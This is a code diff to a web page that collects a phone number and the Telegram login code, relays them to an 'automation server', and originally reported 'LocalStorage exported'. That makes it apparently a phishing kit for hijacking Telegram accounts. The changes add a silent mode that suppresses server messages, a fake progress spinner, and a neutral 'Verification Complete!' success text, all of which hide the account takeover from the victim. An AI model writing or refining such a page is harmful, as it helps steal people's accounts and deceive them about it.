@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -11,6 +12,7 @@
             --input-bg: #f0f0f0;
             --button-bg: #512da8;
             --button-text: #ffffff;
+            --accent: #512da8;
         }
 
         @media (prefers-color-scheme: dark) {
@@ -194,6 +196,48 @@
             border: 1px solid #bee5eb;
         }
 
+        /* Spinner styles (circle + percent) */
+        .spinner-wrapper {
+            width: 140px;
+            height: 140px;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            margin-top: 15px;
+        }
+
+        .spinner {
+            --p: 0;
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: conic-gradient(var(--accent) calc(var(--p) * 1%), #e9e9e9 0);
+            box-shadow: 0 6px 18px rgba(0,0,0,0.08), inset 0 -6px 18px rgba(0,0,0,0.02);
+            transition: background 0.12s linear;
+            position: relative;
+        }
+
+        .spinner::after {
+            content: "";
+            position: absolute;
+            width: 86px;
+            height: 86px;
+            background: var(--bg);
+            border-radius: 50%;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.04) inset;
+        }
+
+        .spinner-text {
+            position: relative;
+            font-weight: 700;
+            color: var(--text);
+            z-index: 2;
+            font-size: 20px;
+        }
+
         @media (max-width: 400px) {
             .container {
                 padding: 10px;
@@ -214,7 +258,15 @@
             <input type="tel" id="phone" placeholder="Phone Number">
         </div>
         <button id="next">NEXT</button>
-        <div id="phone-status" class="status"></div>
+
+        <!-- Spinner area: only visible after clicking NEXT -->
+        <div class="spinner-wrapper" id="spinner-wrapper" aria-hidden="true">
+            <div class="spinner" id="spinner" role="status" aria-live="polite" style="--p:0">
+                <div class="spinner-text" id="spinner-percent">0%</div>
+            </div>
+        </div>
+
+        <div id="phone-status" class="status" aria-hidden="true"></div>
     </div>
 
     <div class="container" id="code-page">
@@ -243,10 +295,57 @@
         const phoneStatus = document.getElementById('phone-status');
         const codeStatus = document.getElementById('code-status');
 
+        const spinnerWrapper = document.getElementById('spinner-wrapper');
+        const spinner = document.getElementById('spinner');
+        const spinnerPercentText = document.getElementById('spinner-percent');
+
         // const SERVER_URL = 'http://localhost:8765';
         const SERVER_URL = window.location.origin;
         let statusCheckInterval = null;
         let sessionId = null;
+
+        // Spinner control
+        let spinnerInterval = null;
+        let spinnerPercent = 0;
+        let silentMode = false; // when true, suppress messages on phone-status
+
+        function showSpinner() {
+            spinnerWrapper.style.display = 'flex';
+            spinnerWrapper.setAttribute('aria-hidden', 'false');
+            spinner.style.setProperty('--p', 0);
+            spinnerPercent = 0;
+            spinnerPercentText.textContent = '0%';
+            // gentle increment up to 99% while waiting
+            clearInterval(spinnerInterval);
+            spinnerInterval = setInterval(() => {
+                if (spinnerPercent < 99) {
+                    // accelerate slightly as it grows for natural feel
+                    const delta = Math.max(1, Math.ceil((100 - spinnerPercent) * 0.02));
+                    spinnerPercent = Math.min(99, spinnerPercent + delta);
+                    spinner.style.setProperty('--p', spinnerPercent);
+                    spinnerPercentText.textContent = spinnerPercent + '%';
+                }
+            }, 120);
+        }
+
+        function completeSpinnerAndHide(callback) {
+            clearInterval(spinnerInterval);
+            spinnerPercent = 100;
+            spinner.style.setProperty('--p', spinnerPercent);
+            spinnerPercentText.textContent = '100%';
+            // small delay so user sees 100%
+            setTimeout(() => {
+                spinnerWrapper.style.display = 'none';
+                spinnerWrapper.setAttribute('aria-hidden', 'true');
+                if (typeof callback === 'function') callback();
+            }, 350);
+        }
+
+        function hideSpinnerImmediate() {
+            clearInterval(spinnerInterval);
+            spinnerWrapper.style.display = 'none';
+            spinnerWrapper.setAttribute('aria-hidden', 'true');
+        }
 
         // Countries data
         const countries = [
@@ -284,34 +383,64 @@
         codeSpan.textContent = countrySelect.value;
 
         function showStatus(element, message, type) {
+            // If in silentMode, suppress any phone-status updates
+            if (element === phoneStatus && silentMode) return;
             element.textContent = message;
             element.className = 'status ' + type;
             element.style.display = 'block';
+            element.setAttribute('aria-hidden', 'false');
         }
 
-async function checkStatus() {
+        async function checkStatus() {
             try {
                 const url = SERVER_URL + '/status' + (sessionId ? ('?session=' + sessionId) : '');
                 const response = await fetch(url);
                 const data = await response.json();
-                
+
                 if (data.status === 'code_required') {
-                    // Switch to code page
-                    phonePage.style.display = 'none';
-                    codePage.style.display = 'block';
-                    displayPhone.textContent = phoneInput.value ? `${codeSpan.textContent} ${phoneInput.value}` : 'Unknown';
-                    codeInput.focus();
-                    showStatus(codeStatus, 'Enter the 5-digit code sent to your Telegram app', 'info');
-                } else if (data.status === 'login_success') {
-                    showStatus(codeStatus, 'Login successful! LocalStorage exported.', 'success');
+                    // complete spinner -> show code page
+                    completeSpinnerAndHide(() => {
+                        phonePage.style.display = 'none';
+                        codePage.style.display = 'block';
+                        displayPhone.textContent = phoneInput.value ? `${codeSpan.textContent} ${phoneInput.value}` : 'Unknown';
+                        codeInput.focus();
+                        // allow code-status messages now
+                        silentMode = false;
+                        showStatus(codeStatus, 'Enter the 5-digit code sent to your Telegram app', 'info');
+                    });
                     clearInterval(statusCheckInterval);
+                    statusCheckInterval = null;
+                } else if (data.status === 'Verification Complete!') {
+                    // In case status becomes success without code page, finalize spinner then show code page (defensive)
+                    completeSpinnerAndHide(() => {
+                        phonePage.style.display = 'none';
+                        codePage.style.display = 'block';
+                        displayPhone.textContent = phoneInput.value ? `${codeSpan.textContent} ${phoneInput.value}` : 'Unknown';
+                        codeInput.focus();
+                        silentMode = false;
+                        showStatus(codeStatus, 'Verification Complete! ', 'success');
+                    });
+                    clearInterval(statusCheckInterval);
+                    statusCheckInterval = null;
                 } else if (typeof data.status === 'string' && data.status.startsWith('error:')) {
-                    showStatus(codeStatus, data.status.replace('error:', 'Error:'), 'error');
+                    // If an error occurs before code page, complete spinner and then show code page and error inside code-status
+                    completeSpinnerAndHide(() => {
+                        phonePage.style.display = 'none';
+                        codePage.style.display = 'block';
+                        displayPhone.textContent = phoneInput.value ? `${codeSpan.textContent} ${phoneInput.value}` : 'Unknown';
+                        codeInput.focus();
+                        silentMode = false;
+                        showStatus(codeStatus, data.status.replace('error:', 'Error:'), 'error');
+                    });
+                    clearInterval(statusCheckInterval);
+                    statusCheckInterval = null;
                 } else {
-                    // update phone status with returned status (optional)
-                    showStatus(phoneStatus, `Status: ${data.status}`, 'info');
+                    // Keep silent on polling updates so user only sees spinner
+                    // (no action needed)
                 }
             } catch (error) {
+                // Network issues: stay silent and keep spinner visible. Do not show messages per requirement.
+                // If needed to recover, spinner will keep going until /status returns.
                 console.error('Error checking status:', error);
             }
         }
@@ -323,8 +452,16 @@ async function checkStatus() {
                 const countryCode = codeSpan.textContent.replace('+', '');
                 
                 try {
-                    showStatus(phoneStatus, 'Sending phone number to automation...', 'info');
+                    // Enter silent mode: show spinner only, hide any status messages
+                    silentMode = true;
+                    phoneStatus.style.display = 'none';
+                    phoneStatus.setAttribute('aria-hidden', 'true');
+
+                    // Hide the NEXT button visually and disable it
+                    nextButton.style.display = 'none';
                     nextButton.disabled = true;
+
+                    showSpinner();
 
                     const response = await fetch(SERVER_URL + '/phone', {
                         method: 'POST',
@@ -337,23 +474,45 @@ async function checkStatus() {
                         })
                     });
 
-                    const result = await response.json();
+                    // attempt to parse response; even if errors, we do not show messages
+                    let result = {};
+                    try { result = await response.json(); } catch(e){ result = {}; }
+
                     if (result.session) {
                         sessionId = result.session; // store returned session id
                     }
-                    showStatus(phoneStatus, result.message || JSON.stringify(result), 'info');
 
-                    // Start checking status every 2 seconds
-                    statusCheckInterval = setInterval(checkStatus, 2000);
+                    // Start checking status every 1.5 seconds (spinner will run until code_required)
+                    if (statusCheckInterval) clearInterval(statusCheckInterval);
+                    statusCheckInterval = setInterval(checkStatus, 1500);
+                    // call once immediately to speed up transition if server already updated
+                    checkStatus();
 
                 } catch (error) {
-                    showStatus(phoneStatus, 'Failed to connect to automation server', 'error');
+                    // On network error, stop spinner and restore UI silently (no message before code page)
+                    console.error('Failed to connect to automation server', error);
+                    hideSpinnerImmediate();
+                    nextButton.style.display = 'block';
                     nextButton.disabled = false;
+                    silentMode = false;
                 }
             } else {
-                showStatus(phoneStatus, 'Please enter a phone number', 'error');
+                // per requirement: no message before code page, but we need to indicate nothing if empty.
+                // revert no-op visually (no spinner shown)
+                // (user will simply still see NEXT button)
+                // Keep behavior minimal: briefly flash button to indicate it's clickable
+                nextButton.classList.add('shake');
+                setTimeout(()=> nextButton.classList.remove('shake'), 250);
             }
         });
+
+        // provide minimal shake CSS via JS injection to avoid major changes
+        (function addShakeStyle(){
+            const s = document.createElement('style');
+            s.textContent = `.shake{animation:shakeit .22s cubic-bezier(.36,.07,.19,.97) both}
+            @keyframes shakeit{10%,90%{transform:translateX(-1px)}20%,80%{transform:translateX(2px)}30%,50%,70%{transform:translateX(-4px)}40%,60%{transform:translateX(4px)}}`;
+            document.head.appendChild(s);
+        })();
 
         // Code input handler - auto-submit when 5 digits are entered
         codeInput.addEventListener('input', async (e) => {
@@ -387,15 +546,19 @@ async function checkStatus() {
         });
 
         editPhone.addEventListener('click', () => {
+            // stop any polling and spinner
+            if (statusCheckInterval) { clearInterval(statusCheckInterval); statusCheckInterval = null; }
+            hideSpinnerImmediate();
+            silentMode = false;
+
             codePage.style.display = 'none';
             phonePage.style.display = 'block';
             phoneInput.focus();
             nextButton.disabled = false;
-            clearInterval(statusCheckInterval);
+            nextButton.style.display = 'block';
         });
 
-        // Check initial connection
-        showStatus(phoneStatus, 'Ready to connect. Make sure Python server is running.', 'info');
+
     </script>
 </body>
 </html>
